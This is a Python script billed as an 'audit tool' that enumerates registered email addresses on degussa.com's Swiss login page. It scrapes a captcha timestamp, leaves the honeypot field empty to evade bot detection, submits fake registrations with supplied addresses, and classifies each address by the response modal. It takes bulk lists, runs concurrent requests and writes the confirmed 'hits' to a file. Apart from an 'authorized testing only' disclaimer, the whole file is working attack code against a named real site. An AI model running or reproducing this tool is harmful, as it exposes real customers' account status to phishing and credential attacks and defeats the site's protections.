#!/usr/bin/env python3
"""
Degussa Email Checker — Security Audit Tool
Exploits email enumeration vulnerability on degussa.com registration.
For authorized security testing only.
"""

import httpx
import asyncio
import re
import sys
import time
import argparse
from datetime import datetime

# ─── Config ───
BASE_URL = "https://degussa.com/ch-de/ssologin/"
HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "Accept-Language": "de-CH,de;q=0.9",
    "Origin": "https://degussa.com",
    "Referer": BASE_URL,
    "Content-Type": "application/x-www-form-urlencoded",
}

# Colors
G = "\033[92m"  # green
R = "\033[91m"  # red
Y = "\033[93m"  # yellow
C = "\033[96m"  # cyan
W = "\033[0m"   # reset
B = "\033[1m"   # bold


def banner():
    print(f"""{C}{B}
    ╔══════════════════════════════════════════╗
    ║   DEGUSSA EMAIL CHECKER — Audit Tool     ║
    ║   Target: degussa.com/ch-de/ssologin/    ║
    ╚══════════════════════════════════════════╝{W}
    """)


async def check_email(client: httpx.AsyncClient, email: str, semaphore: asyncio.Semaphore) -> dict:
    """Check if an email is registered on Degussa."""
    async with semaphore:
        result = {"email": email, "status": "unknown", "error": None}

        try:
            # Step 1: GET — grab session cookie + captcha2 timestamp
            resp_get = await client.get(BASE_URL, headers=HEADERS, follow_redirects=True, timeout=15)
            
            # Extract captcha2 timestamp
            match = re.search(r'name="input_captcha2"\s+id="input_captcha2"\s+value="(\d+)"', resp_get.text)
            if not match:
                result["status"] = "error"
                result["error"] = "captcha2 not found"
                return result

            captcha2 = match.group(1)

            # Step 2: POST — submit registration with target email
            form_data = {
                "input_email": email,
                "input_email_2": email,
                "input_password": "AuditTest99!Xz",
                "input_password_2": "AuditTest99!Xz",
                "salutation": "m",
                "sur_name": "Security",
                "last_name": "Audit",
                "input_street": "Teststrasse",
                "input_street_no": "1",
                "post_code": "8001",
                "city": "Zurich",
                "country": "ch",
                "birthday": "01.01.1985",
                "input_phone_no": "+41700000000",
                "input_captcha1": "",           # honeypot — leave empty
                "input_captcha2": captcha2,      # timestamp token
                "newsletter_subscribe": "0",
                "saveModelFormButton": "true",
            }

            resp_post = await client.post(
                BASE_URL, headers=HEADERS, data=form_data,
                follow_redirects=True, timeout=15
            )

            body = resp_post.text

            # Step 3: Analyze response
            if "modal--error" in body:
                result["status"] = "registered"     # email EXISTS
            elif "modal--success" in body:
                result["status"] = "not_registered"  # email does NOT exist
            else:
                result["status"] = "unknown"
                result["error"] = "unexpected response"

        except httpx.TimeoutException:
            result["status"] = "error"
            result["error"] = "timeout"
        except Exception as e:
            result["status"] = "error"
            result["error"] = str(e)[:80]

        return result


def print_result(r: dict, index: int):
    email = r["email"]
    status = r["status"]

    if status == "registered":
        print(f"  {B}[{index:>4}]{W} {R}REGISTERED{W}    {email}")
    elif status == "not_registered":
        print(f"  {B}[{index:>4}]{W} {G}NOT FOUND{W}     {email}")
    elif status == "error":
        print(f"  {B}[{index:>4}]{W} {Y}ERROR{W}         {email}  ({r['error']})")
    else:
        print(f"  {B}[{index:>4}]{W} {Y}UNKNOWN{W}       {email}")


async def run(emails: list[str], threads: int, delay: float):
    semaphore = asyncio.Semaphore(threads)
    results = []
    stats = {"registered": 0, "not_registered": 0, "error": 0, "unknown": 0}

    print(f"  {C}Targets:{W}  {len(emails)} emails")
    print(f"  {C}Threads:{W}  {threads}")
    print(f"  {C}Delay:{W}    {delay}s between batches")
    print(f"  {C}Started:{W}  {datetime.now().strftime('%H:%M:%S')}")
    print(f"  {'─' * 50}")

    async with httpx.AsyncClient(http2=True, verify=True) as client:
        for i in range(0, len(emails), threads):
            batch = emails[i:i + threads]
            tasks = [check_email(client, email, semaphore) for email in batch]
            batch_results = await asyncio.gather(*tasks)

            for j, r in enumerate(batch_results):
                idx = i + j + 1
                print_result(r, idx)
                results.append(r)
                stats[r["status"]] = stats.get(r["status"], 0) + 1

            if delay > 0 and i + threads < len(emails):
                await asyncio.sleep(delay)

    # Summary
    print(f"\n  {'═' * 50}")
    print(f"  {B}RESULTS{W}")
    print(f"  {R}Registered:     {stats['registered']}{W}")
    print(f"  {G}Not found:      {stats['not_registered']}{W}")
    print(f"  {Y}Errors/Unknown: {stats['error'] + stats['unknown']}{W}")
    print(f"  Total:          {len(results)}")

    # Save results
    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
    outfile = f"results_{ts}.txt"
    with open(outfile, "w") as f:
        f.write(f"# Degussa Email Check — {datetime.now().isoformat()}\n")
        f.write(f"# registered / not_registered / error\n\n")
        for r in results:
            f.write(f"{r['status']:<20} {r['email']}\n")

    # Save hits only
    hits = [r for r in results if r["status"] == "registered"]
    if hits:
        hitfile = f"hits_{ts}.txt"
        with open(hitfile, "w") as f:
            for r in hits:
                f.write(f"{r['email']}\n")
        print(f"\n  {R}{B}Hits saved:{W} {hitfile}")

    print(f"  {C}Full log:{W}  {outfile}\n")
    return results


def main():
    banner()

    parser = argparse.ArgumentParser(description="Degussa email enumeration checker")
    group = parser.add_mutually_exclusive_group(required=True)
    group.add_argument("-e", "--email", help="Single email to check")
    group.add_argument("-f", "--file", help="File with one email per line")
    parser.add_argument("-t", "--threads", type=int, default=3, help="Concurrent checks (default: 3)")
    parser.add_argument("-d", "--delay", type=float, default=1.0, help="Delay between batches in seconds (default: 1.0)")

    args = parser.parse_args()

    if args.email:
        emails = [args.email.strip()]
    else:
        with open(args.file) as f:
            emails = [line.strip() for line in f if line.strip() and "@" in line]

    if not emails:
        print(f"  {R}No valid emails provided.{W}")
        sys.exit(1)

    asyncio.run(run(emails, args.threads, args.delay))


if __name__ == "__main__":
    main()
